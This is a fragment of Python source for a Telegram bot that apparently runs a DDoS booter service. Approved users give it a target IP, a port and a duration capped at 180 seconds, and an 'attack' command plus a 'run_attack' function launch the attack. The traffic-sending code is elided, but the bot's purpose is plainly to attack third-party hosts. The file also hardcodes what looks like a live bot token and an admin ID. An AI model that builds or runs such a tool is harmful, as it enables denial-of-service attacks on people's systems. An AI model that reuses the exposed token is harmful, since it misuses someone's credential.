...
# Configuration
TELEGRAM_BOT_TOKEN = ("7527768602:AAEBW16wz1DNYzn-uIc5ks8zEOA_GfXAdCk")  # Fetch token from environment variable
ADMIN_USER_ID = 5004674194
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@Anupeiejfj"  # Replace with your channel username
...
async def attack(update: Update, context: CallbackContext):
    ...
    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐈𝐒 𝐁𝐎𝐓 𝐊𝐀 𝐔𝐏𝐀𝐘𝐎𝐆 𝐊𝐀𝐑𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐀𝐀𝐏𝐀𝐊𝐎 𝐎𝐖𝐍𝐄𝐑 𝐊𝐈 𝐀𝐍𝐔𝐌𝐀𝐓𝐈 𝐊𝐈 𝐀𝐀𝐕𝐀𝐒𝐇𝐘𝐀𝐊𝐴𝐓𝐴 𝐇𝐀𝐈 @Anupeiejfj.*", parse_mode='Markdown')
        return
    ...
    # Limit time to 180 seconds
    try:
        time = int(time)
        if time > 180:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum attack time is 180 seconds.*", parse_mode='Markdown')
            return
    except ValueError:
...
async def run_attack(chat_id, ip, port, time, context):
    ...
    try:
        ...
        "*𝐒𝐄𝐍𝐃 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐓𝐎 𝐎𝐖𝐍𝐄𝐑 :-@Anupeiejfj*" , parse_mode='Markdown')
